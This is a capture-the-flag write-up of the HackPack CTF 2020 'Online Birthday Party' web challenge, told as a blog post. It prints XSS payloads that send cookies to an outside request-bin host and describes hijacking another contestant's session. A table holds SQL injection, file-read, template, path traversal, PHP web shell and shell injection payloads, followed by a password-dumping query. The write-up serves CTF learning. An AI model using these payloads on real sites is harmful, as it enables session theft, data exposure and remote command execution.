---
title: 'HackPack CTF 2020: Online Birthday Party'
date: 2020-05-18
categories: [writeups]
author: None
---
## Crowdsourcing a CTF Challenge

> This pandemic hit everybody hard. Especially, those who want to make a
> birthday party. That is why we decided to create a website where you
> can find those who have the same birthdate as yours. Check it out:
> https://online-birthday-party.cha.hackpack.club/

<!--more-->

I noticed straight away that the username wasn't sanitised, so I figured
this was an XSS challenge. I set up a request bin in preparation for
snooping some cookies, and then tried to register with the neat
cross-origin image exfiltration technique

``` {.html}
<script>document.write('<img src="https://enii5hhtwuak.x.pipedream.net/?cookie='+document.cookie+'">')</script>
```

but the website complained it was too long so I had to settle instead
for the much more brutish relocation technique:

``` {.html}
<script>document.location='https://enii5hhtwuak.x.pipedream.net/?cookie='+document.cookie</script>
```

Then I waited, and waited some more. After a long while, and having more
or less given up on the approach, I finally got a hit. I copied the
cookie and reloaded the page:

> Hello, blacknote10!
>
> Your birthday: 0' OR 1=1 \#--

Hello blacknote, indeed. This was not the automatic script I had
expected, but another contestant. It now dawned on me that this
challenge was not meant to be a JavaScript injection in the username,
but a SQL injection in the birthday.

blacknote had written an injection which let them list every account
with their birthdays. Since my account was on the list, they had, for
them I expect rather annoyingly, been redirected to my request bin.

I could see blacknote evolve their injection in real time, but better
yet I could copy their first injection to see everyones accounts. Here
are some examples in no particular order:

| Username                                                                                             | Birthday                                                                                          | Comment                                            |
|:-----------------------------------------------------------------------------------------------------|:--------------------------------------------------------------------------------------------------|:--------------------------------------------------:|
| `admin`                                                                                              | `1/1/2001`                                                                                        | The admin account. Note the different date format. |
| `x-1587597992`                                                                                       | `2020-04-1`                                                                                       |                                                    |
| `herve`                                                                                              | `2020-04-24`                                                                                      | Some normal looking stuff.                         |
| `abc`                                                                                                | `214748-03-31`                                                                                    | A strange year.                                    |
| `test1`                                                                                              | `'or'1'='1'--`                                                                                    |                                                    |
| `asdf`                                                                                               | `' UNION SELECT NULL`                                                                             |                                                    |
| `'`                                                                                                  | `' ON DUPLICATE KEY UPDATE password="asdf" --`                                                    |                                                    |
| `www`                                                                                                | `2002-01-01' UNION SELECT * FROM ` `information_schema.columns WHERE table_name = '%`             |                                                    |
| `k3`                                                                                                 | `2020-04-06 order by 10-- -`                                                                      | Heaps of SQL injections.                           |
| `{{config}}`                                                                                         | `2000-01-01`                                                                                      |                                                    |
| `{{ 7*7 }}`                                                                                          | `1994-03-04`                                                                                      | Template injections.                               |
| `whaaat`                                                                                             | `1' OR password like 'flag{%`                                                                     | Interesting!                                       |
| `c:/Windows/system.ini`                                                                              | `2020-04-23`                                                                                      |                                                    |
| `..\..\..\..\..\..\..\..\..` `\..\..\..\..\..\..\..\Windows\system.ini`                              | `2020-04-23`                                                                                      |                                                    |
| `/etc/passwd`                                                                                        | `2020-04-23`                                                                                      | Direct file traversals.                            |
| `p4`                                                                                                 | `' union SELECT load_file('/var/lib/mysql-files/flag.txt'),1;-- -`                                |                                                    |
| `p6`                                                                                                 | `' union SELECT load_file(0x272f7661722f6c69622f6d79` `73716c2d66696c65732f666c61672e74787427),1;--` | File traversal through SQL.                        |
| `flag`                                                                                               | `2020-04-23`                                                                                      | Don't think that's going to work.                  |
| `thishouldnotexistandhopefullyitwillnot`                                                             | `2020-04-23`                                                                                      | Alas, it does.                                     |
| `http://www.google.com:80/search?q=OWASP%20ZAP`                                                      | `2020-04-23`                                                                                      | Not sure what's going on here.                     |
| `<!--#EXEC cmd="ls /"-->`                                                                            | `2020-04-23`                                                                                      | Some other form of injection.                      |
| `<b>hi</b>`                                                                                          | `0000-01-01`                                                                                      |                                                    |
| `ab`                                                                                                 | `<u>aa</u>`                                                                                       | HTML injections.                                   |
| `ab1`                                                                                                | `<script>alert(1)</script>`                                                                       |                                                    |
| `<script>alert('yo');</script>`                                                                      | `2020-04-27`                                                                                      | Other peoples JavaScript injections.               |
| `admin`                                                                                              | `2020-04-08`                                                                                      | Another admin account.                             |
| `herve2`                                                                                             | `\\a\l\e\r\t\(\'\X\S\S\'\)\;\`                                                                    |                                                    |
| `herve3`                                                                                             | `'\\U\N\I\O\N\A\L\L\S\E\L\E\C\T\*\F\R\O\M\u\s\e\r\s\'`                                            | Lots of leaning sticks.                            |
| `jHcY') AND 8400=7228 AND ('QIlv'='QIlv`                                                             | `hpXo`                                                                                            |                                                    |
| `jHcY") AS jHgo WHERE 5594=5594 AND 5122=7506-- YpXl`                                                | `hpXo`                                                                                            | A bunch of stuff like this.                        |
| `<script>alert(10)</script>`                                                                         | `1337-10-10`                                                                                      | My first JavaScript injection.                     |
|`<script>document.location='` `https://enii5hhtwuak.x.pipedream.net/?cookie='+document.cookie</script>`| `1337-11-10`                                                                                      | My second JavaScript injeciton.                    |
| `<?php     if(isset($_GET['cmd']))     {         system($_GET['cmd']);     } ?>`                     | `2020-03-19`                                                                                      | PHP injection.                                     |
| `ab2`                                                                                                | `whoami`                                                                                          | Shell injection.                                   |


Looking through these it was not too hard to figure out how to also dump the
passwords – something like:

```
' UNION SELECT username, password FORM users WHERE '' = '
```

So now, if I wanted to try something out, I didn't have to create an new
account, but could simply log into the existing one instead. As an added
bonus, the flag was found as the password for the admin account:

```
flag{c0mpl1cat3d_2nd_0rd3r_sql}
```
